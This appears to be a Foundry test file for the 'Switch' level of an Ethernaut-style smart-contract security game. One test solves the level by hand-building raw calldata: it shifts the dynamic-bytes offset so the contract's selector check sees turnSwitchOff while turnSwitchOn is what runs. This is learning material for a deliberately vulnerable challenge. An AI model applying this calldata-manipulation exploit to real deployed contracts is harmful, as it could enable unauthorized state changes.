pragma solidity 0.8.11;

import "src/levels/Switch/Switch.sol";
import "src/levels/Switch/SwitchFactory.sol";
import "forge-std/Test.sol";

contract SwitchAttackTest is Test {
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    SwitchFactory public factory;
    Switch public instance;

    function setUp() public {
        factory = new SwitchFactory();
        instance = Switch(factory.createInstance(dummyPlayerAddress));
    }

    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
    }

    function testfail_ShouldRevertIfPlayerAttackIsWrong() public {
        vm.startPrank(dummyPlayerAddress);
        vm.expectRevert();
        instance.flipSwitch("0x00");
    }

    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        vm.startPrank(dummyPlayerAddress);

        // Compute selectors
        bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));

        // Build raw calldata from bytes
        bytes memory calldata_ = bytes.concat(
            flipSelector, //|4B flipSelector|
            bytes32(uint256(68)), //|32B ptr to _data in calldata (0x00..44)|
            bytes32(uint256(0)), //|32B 0x00..00|
            offSelector, //|4B offSelector|
            bytes32(uint256(4)), //|32B _data length (0x00..04)|
            onSelector //|4B _data[0] 4 MSB (onSelector)|
        );

        // Attack through low level call
        (bool result,) = address(instance).call(calldata_);
        require(result);

        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), true);
    }
}
